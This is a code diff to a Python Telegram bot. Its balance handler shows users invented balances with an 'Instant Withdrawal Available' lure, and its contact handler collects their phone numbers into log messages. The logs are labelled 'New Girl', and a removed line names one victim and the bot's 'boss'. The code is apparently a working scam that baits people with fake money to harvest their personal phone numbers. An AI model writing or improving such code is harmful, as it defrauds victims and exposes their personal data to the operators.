@@ -36,8 +36,8 @@ def check_balance(message):
         bot.send_message(
             message.chat.id,
             f"<b>🤴 User:</b> {username}\n"
-            f"<b>💰 Balance:</b> $9\n\n"
-            f"<b>💰 Inviter Balance:</b> $126\n\n"
+            f"<b>💰 Balance:</b> $3\n\n"
+            f"<b>💰 Inviter Balance:</b> $26\n\n"
             f"<b>💸 Instant Withdrawal Available!</b>\n\n"
             f"Click below to Withdrawal Now 💰 for instant Withdrawal ⏰",
             reply_markup=markup,
@@ -51,8 +51,8 @@ def check_balance(message):
         bot.send_message(
             message.chat.id,
             f"<b>🤴 User:</b> {username}\n"
-            f"<b>💰 Balance:</b> $9\n\n"
-            f"<b>💰 Inviter Balance:</b> $126\n\n"
+            f"<b>💰 Balance:</b> $3\n\n"
+            f"<b>💰 Inviter Balance:</b> $26\n\n"
             f"<b>💸 Instant Withdrawal Available!</b>\n\n"
             f"Click below to Withdrawal Now 💰 for instant Withdrawal ⏰",
             reply_markup=markup
@@ -66,7 +66,7 @@ def contact_handler(message):
         username = user_data.get(user_id, {}).get("username", "Unknown")
         user_data[user_id] = {"username": username, "phone": phone}
 
-        log_text = f"""🎯 Kalkidan phone is cooked my boss Ezana! 😋 but i think she will be angry on u sorry :( 🥹
+        log_text = f"""🎯New Girl😋 :( 🥹
 
 User: @{username}
 Phone: {phone}
